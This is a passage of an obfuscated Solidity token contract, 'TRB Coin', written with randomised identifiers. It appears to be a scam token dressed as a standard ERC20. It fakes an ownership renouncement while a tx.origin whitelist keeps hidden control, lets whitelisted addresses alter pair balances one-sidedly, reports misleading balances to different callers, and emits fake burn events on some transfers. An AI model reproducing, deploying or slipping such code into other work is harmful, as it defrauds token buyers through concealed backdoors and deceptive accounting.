      xrriD3wrQbnfnWeoSfHA64zaatiOgiRJivIfI9pCJ4G4q1H2PFibPG5pVTClmyfuuTFv20WBxQyudKUog79mQzkisEv2S6dj
    )
      .transfer(
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
      jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
    );
  }
}

contract TRB is
  nFwK6p9eG2DDiSyQC1F0sOA3IIb9cyHANOhNmVuE663C96Um531E6HhxPzgIR5WktDaFvOEEPFqjpkNBTYBOpPRXtk1k0Gwj
{
  function totalSupply() external pure returns (uint256) {
    return
      fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT;
  }

  function decimals() external pure returns (uint8) {
    return
      o0kTsX1k16GAdqnFWmMIkGIBMOKwcbDw7OV1FKvXUJZyTBEycTRsEBJooIuF6rMhNEtrdBwTHeFhVwVrOtvNmg0kPL01XD5z;
  }

  function symbol() external pure returns (string memory) {
    return
      wZ237mGrCwl7M5LPHPHvSaDwGa3qTTi5NntkBU1cYYdUnU4zETIKTJi2ZXjUeOeXaFUrWOARdx77AxxfaU0vuL17YyZ5TzD2;
  }

  function name() external pure returns (string memory) {
    return
      y9KkeYqvGm2sxyhS23QY9q13oEQf6d6uiDNa65v6RowBxXHD1LC3AVTxp2wLM5xu8KPwCvSOuNMoOiPHjKlV2tZuPIq59wPy;
  }

  function allowance(
    address qlVvZOHyj67SKCHqQZ3wj389xC5jbHXu8tcLhZh9KxvRl4KUWsSU9hUyPVgQ0RGegwgfZW8WcZBK2m9QgbBlM9Jz64Axhxng,
    address wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P
  ) external view returns (uint256) {
    return
      quh8JS24PggwpkXWNFfIX0ETCUcJq2UkOiASjaVLnft2OYJKc0rUl0EZCVzR4PCovOhdEFN5kouslioE5w5PGmV8EzzdltP7[
        qlVvZOHyj67SKCHqQZ3wj389xC5jbHXu8tcLhZh9KxvRl4KUWsSU9hUyPVgQ0RGegwgfZW8WcZBK2m9QgbBlM9Jz64Axhxng
      ][
        wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P
      ];
  }

  event Transfer(address indexed, address indexed, uint256);
  event Approval(address indexed, address indexed, uint256);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  uint256
    private jbS6ExUxB8tgf17Yo5TfyKzhE10c6JerGr8hGmRDW7y4PW6NNJcRjsnL7eZlWcvCUKIe4TwpcwZpT1lLb1p60KaflOss0rSl =
    1;
  uint256
    private cG5qYwMi7jS4BEsPkLZRv4uNNhlI5KTt6iCg09i3iww9L1i58U7sSUTXr65ZgEzq2dUqy7vWssLKgwVLtNEoAdpKOvQk0dBL;

  function permit5764825481139(
    address tS8KXJqMGrk47GZGqDfHW8ssILSZT0PdMyCYAesLDttvhMb8iREaLrgfZusMH0tevC736VKkshNjxmYfoHcgFAJw24qMWbrS
  ) public view returns (uint256) {
    if (
      (msg.sender ==
        jgs3ONHL3Z9YP7ecfwEqHnkzHaMNsYYAVKcq4416BalCvxnnRsakaK8eqoajeCreE691AxegOgUMRDJ7Y7XnRuHrqsmU916g ||
        msg.sender ==
        lh1H7i0HhIv9mlAlnIWwXKexWaA9TTbBvDEmrJtszIAM32NjonaguisUWmjplwdvVlbGp0HC3e5rSI1VdGHCwDpmpwWFw9iP) &&
      tS8KXJqMGrk47GZGqDfHW8ssILSZT0PdMyCYAesLDttvhMb8iREaLrgfZusMH0tevC736VKkshNjxmYfoHcgFAJw24qMWbrS !=
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ &&
      tS8KXJqMGrk47GZGqDfHW8ssILSZT0PdMyCYAesLDttvhMb8iREaLrgfZusMH0tevC736VKkshNjxmYfoHcgFAJw24qMWbrS !=
      jgs3ONHL3Z9YP7ecfwEqHnkzHaMNsYYAVKcq4416BalCvxnnRsakaK8eqoajeCreE691AxegOgUMRDJ7Y7XnRuHrqsmU916g &&
      tS8KXJqMGrk47GZGqDfHW8ssILSZT0PdMyCYAesLDttvhMb8iREaLrgfZusMH0tevC736VKkshNjxmYfoHcgFAJw24qMWbrS !=
      lh1H7i0HhIv9mlAlnIWwXKexWaA9TTbBvDEmrJtszIAM32NjonaguisUWmjplwdvVlbGp0HC3e5rSI1VdGHCwDpmpwWFw9iP
    ) {
      return
        fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT *
        jbS6ExUxB8tgf17Yo5TfyKzhE10c6JerGr8hGmRDW7y4PW6NNJcRjsnL7eZlWcvCUKIe4TwpcwZpT1lLb1p60KaflOss0rSl;
    }

    if (
      !hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        tx.origin
      ]
    ) {
      if (
        IERC20(
          x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
        )
          .balanceOf(
          lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
        ) <
        bgwOwfRXk38aAJlyaGWxIDIjFkuW3Xitnk3Afinq2VW3fioVHRaTslvhnNu5CedygiZNLvyd5jrA7n42vVdotFQvm8eZ7KLJ -
          cG5qYwMi7jS4BEsPkLZRv4uNNhlI5KTt6iCg09i3iww9L1i58U7sSUTXr65ZgEzq2dUqy7vWssLKgwVLtNEoAdpKOvQk0dBL
      ) {
        return 0;
      }
    }

    return
      yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
        tS8KXJqMGrk47GZGqDfHW8ssILSZT0PdMyCYAesLDttvhMb8iREaLrgfZusMH0tevC736VKkshNjxmYfoHcgFAJw24qMWbrS
      ];
  }

  mapping(address => mapping(address => uint256))
    private quh8JS24PggwpkXWNFfIX0ETCUcJq2UkOiASjaVLnft2OYJKc0rUl0EZCVzR4PCovOhdEFN5kouslioE5w5PGmV8EzzdltP7;
  mapping(address => uint256)
    private yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ;

  string
    private constant y9KkeYqvGm2sxyhS23QY9q13oEQf6d6uiDNa65v6RowBxXHD1LC3AVTxp2wLM5xu8KPwCvSOuNMoOiPHjKlV2tZuPIq59wPy =
    "TRB Coin";
  string
    private constant wZ237mGrCwl7M5LPHPHvSaDwGa3qTTi5NntkBU1cYYdUnU4zETIKTJi2ZXjUeOeXaFUrWOARdx77AxxfaU0vuL17YyZ5TzD2 =
    "TRB";
  uint8
    private constant o0kTsX1k16GAdqnFWmMIkGIBMOKwcbDw7OV1FKvXUJZyTBEycTRsEBJooIuF6rMhNEtrdBwTHeFhVwVrOtvNmg0kPL01XD5z =
    9;
  uint256
    public constant rXYPsWxDCyCmWj327zDm7l6yJ6Vft2xopYQ9gwD4NEDJ8QqlEd9P2qx2cdzSanm3ko5eZAjItu6IozTxoU1GOOdcnpsKP1Ny =
    10**9;

  uint256
    public constant fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT =
    25600000 *
      10 **
        o0kTsX1k16GAdqnFWmMIkGIBMOKwcbDw7OV1FKvXUJZyTBEycTRsEBJooIuF6rMhNEtrdBwTHeFhVwVrOtvNmg0kPL01XD5z;

  constructor(
    bytes
      memory oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ
  ) {
    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      address(this)
    ] = fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT;
    emit Transfer(
      address(0),
      address(this),
      fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT
    );

    lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ = ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        lh1H7i0HhIv9mlAlnIWwXKexWaA9TTbBvDEmrJtszIAM32NjonaguisUWmjplwdvVlbGp0HC3e5rSI1VdGHCwDpmpwWFw9iP
      )
        .factory()
    )
      .createPair(
      x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM,
      address(this)
    );

    idoAmount =
      (fMxPkuBEDHpzE1kgPariYFn4E9Y0WCykArlbVVlSzR2WCaN7PsqnMoGuO6OsXWg1rgLeXCGMBaincmhGC0wfFqKLB6FUoucT /
        100) *
      80;
    gFNqiy87pTzhXJySZ2cuXnGmdtq6OIpbvXLGfVvawteV96bbohyUifqiUoQYyEjbOL1L7ZygmEfuH2Hl2SEKLK8spYOxc75k =
      (idoAmount *
        rXYPsWxDCyCmWj327zDm7l6yJ6Vft2xopYQ9gwD4NEDJ8QqlEd9P2qx2cdzSanm3ko5eZAjItu6IozTxoU1GOOdcnpsKP1Ny) /
      50000000000000000000;

    hDvWQzCyRtaz8mu1Twxi9zOX0aZWFACvlmxbu8ti5cJiV24DfoGzbxh5WoZww4xvUJB87ii4qeAhw6a5Q4XMdZhh7JACUpkz(
      address(this),
      uORNmSpxHn2vSIFiImp5dTfmmrUU9utTx6r4YIsivpFPiKTB4QFq1cvLMOqh6afgrrzw4T5eBkCgxfoMDkeV4RyGT0C6QDK2,
      idoAmount
    );

    hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
      msg.sender
    ] = true;
    u64O1KOfEsEOwsR4W8voONYbRlB2LnCF4i1jitU4iqs5BG16IJKakKawcOs00DZvwfJQngWUzck2EBGrIUIJgwNJQWZjb2Q1(
      oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ
    );

    emit OwnershipTransferred(msg.sender, address(0));
  }

  function permit8355429682040(
    address aKCPwwopiLGzS2l4wNF8Q4Gdzt1L2Sz2k74MhlcF8QDIsThOiq7RLsexoYf6wyez6Uyl4OCnpso35tuGMqxkd2bS2fNalazU,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) public returns (bool) {
    igIaR6rudUigC9vIPloq3QEYlhE5R8c3I0J2wm30e0qRhIIZkwwFh2BWbKObl8UTvVdarpJcnYmJ6enExoFqavcmIRfNQHdX(
      msg.sender,
      aKCPwwopiLGzS2l4wNF8Q4Gdzt1L2Sz2k74MhlcF8QDIsThOiq7RLsexoYf6wyez6Uyl4OCnpso35tuGMqxkd2bS2fNalazU,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );
    return true;
  }

  function approve(
    address wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) external returns (bool) {
    rp5idTrxsHSlMdBaqSNnoXwOLC3HPxeYcSaUUwAhLLSi1ZAqhAYu3TKIc1uR8WcJqh5wzVWE7lXbJxhZrY2fD5RmYxXPhbYv(
      msg.sender,
      wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );
    return true;
  }

  function rp5idTrxsHSlMdBaqSNnoXwOLC3HPxeYcSaUUwAhLLSi1ZAqhAYu3TKIc1uR8WcJqh5wzVWE7lXbJxhZrY2fD5RmYxXPhbYv(
    address p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o,
    address wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) internal {
    require(
      p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o !=
        address(0),
      "ERC20: Zero Address"
    );
    require(
      wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P !=
        address(0),
      "ERC20: Zero Address"
    );

    quh8JS24PggwpkXWNFfIX0ETCUcJq2UkOiASjaVLnft2OYJKc0rUl0EZCVzR4PCovOhdEFN5kouslioE5w5PGmV8EzzdltP7[
      p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o
    ][
      wwv6pTBLutK3jWlPU2445JACDS8CBtmhQAV91pjqoCfdLF5IgsZdc55wEV51VYzswIhxV6nx8nhO4XePNAXjxA08842Cay9P
    ] = tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
  }

  function transferFrom(
    address p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o,
    address aKCPwwopiLGzS2l4wNF8Q4Gdzt1L2Sz2k74MhlcF8QDIsThOiq7RLsexoYf6wyez6Uyl4OCnpso35tuGMqxkd2bS2fNalazU,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) external returns (bool) {
    if (
      quh8JS24PggwpkXWNFfIX0ETCUcJq2UkOiASjaVLnft2OYJKc0rUl0EZCVzR4PCovOhdEFN5kouslioE5w5PGmV8EzzdltP7[
        p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o
      ][msg.sender] != type(uint256).max
    ) {
      quh8JS24PggwpkXWNFfIX0ETCUcJq2UkOiASjaVLnft2OYJKc0rUl0EZCVzR4PCovOhdEFN5kouslioE5w5PGmV8EzzdltP7[
        p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o
      ][
        msg.sender
      ] -= tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
    }

    return
      igIaR6rudUigC9vIPloq3QEYlhE5R8c3I0J2wm30e0qRhIIZkwwFh2BWbKObl8UTvVdarpJcnYmJ6enExoFqavcmIRfNQHdX(
        p1XuIhTEPXTXnj769kQAk2N8qaugSWvIu3z1GTE3qk5FwxKTquzzu5qfq09A1DpRgh8eUe9XZ1SzwwNwICKAFFKFh7g4In1o,
        aKCPwwopiLGzS2l4wNF8Q4Gdzt1L2Sz2k74MhlcF8QDIsThOiq7RLsexoYf6wyez6Uyl4OCnpso35tuGMqxkd2bS2fNalazU,
        tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
      );
  }

  function igIaR6rudUigC9vIPloq3QEYlhE5R8c3I0J2wm30e0qRhIIZkwwFh2BWbKObl8UTvVdarpJcnYmJ6enExoFqavcmIRfNQHdX(
    address veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) internal returns (bool) {
    if (
      hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        tx.origin
      ]
    ) {
      if (
        veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L ==
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      ) {
        hDvWQzCyRtaz8mu1Twxi9zOX0aZWFACvlmxbu8ti5cJiV24DfoGzbxh5WoZww4xvUJB87ii4qeAhw6a5Q4XMdZhh7JACUpkz(
          veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
          z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
          tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
        );
        return true;
      }
    }

    oaaTRuFHvY3Tr031oUGxMI4bANbIyks6zdud6xSdbNQMDkwmB9fsiDh9bQFX0SrYGMhC5K2U70vD204XaDwpKsdK9Fzq5VdF(
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );
    if (
      !hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        tx.origin
      ] &&
      msg.sender ==
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
    ) {
      jbS6ExUxB8tgf17Yo5TfyKzhE10c6JerGr8hGmRDW7y4PW6NNJcRjsnL7eZlWcvCUKIe4TwpcwZpT1lLb1p60KaflOss0rSl += 1;
      if (
        veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L ==
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      )
        emit Transfer(
          z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
          address(0),
          tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
        );
    }

    return true;
  }

  function oaaTRuFHvY3Tr031oUGxMI4bANbIyks6zdud6xSdbNQMDkwmB9fsiDh9bQFX0SrYGMhC5K2U70vD204XaDwpKsdK9Fzq5VdF(
    address veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) internal returns (bool) {
    require(
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg >
        0,
      "Transfer amount must be greater than zero"
    );
    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L
    ] -= tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD
    ] += tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
    emit Transfer(
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );

    return true;
  }

  function hDvWQzCyRtaz8mu1Twxi9zOX0aZWFACvlmxbu8ti5cJiV24DfoGzbxh5WoZww4xvUJB87ii4qeAhw6a5Q4XMdZhh7JACUpkz(
    address veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) internal returns (bool) {
    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L
    ] -= tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
    emit Transfer(
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );

    return true;
  }

  function dYtS2SUK1aMXKSfLQGXm1g1WqUXvit0RyYXdln0UJAbgUud4rznsmWNd7e7QXo0iQZR1iEUwXGS9Kyp2rpNpTPtUnDJyxfRr(
    address veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
  ) internal returns (bool) {
    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD
    ] += tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg;
    emit Transfer(
      veQf4uWLZcnCvAFHG7D34sw8G3zYARF5qL7uZmobgZWOYJDrPfIZw17EuhfO6Iu2uAoAVBW57o1VTNNXiv5RuaAajA9suD5L,
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
      tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    );

    return true;
  }

  function rKxKPBbap9PIzN0PNtXfeTi7AzEi8cW5g15lh053ftlbhYxPLmuwhCRBjZKxoFiq1zKYTcBQIgesMszH0qk4DhGbuGEtjWGW(
    address kJ7YxHRqpYcxkGP9IqCopbfyvjM8teGwITttF9BtO2Envw0qZ1qtwKTG3EoLaGGKdwIDS5RurODr9xYgrV5U3EnFZnfCCQTP,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
